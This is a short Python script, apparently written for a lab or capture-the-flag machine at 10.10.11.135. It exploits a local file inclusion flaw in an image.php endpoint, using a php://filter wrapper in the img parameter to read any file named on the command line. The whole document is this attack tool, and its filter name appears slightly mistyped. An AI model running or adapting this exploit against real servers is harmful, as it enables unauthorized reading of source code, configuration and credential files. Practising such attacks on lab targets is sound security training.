import requests
import sys

file_name = sys.argv[1]
url = "http://10.10.11.135/image.php?img=php://filter/convert.base64-decoder/resource=" + file_name

response = requests.get(url)
print(response.text)
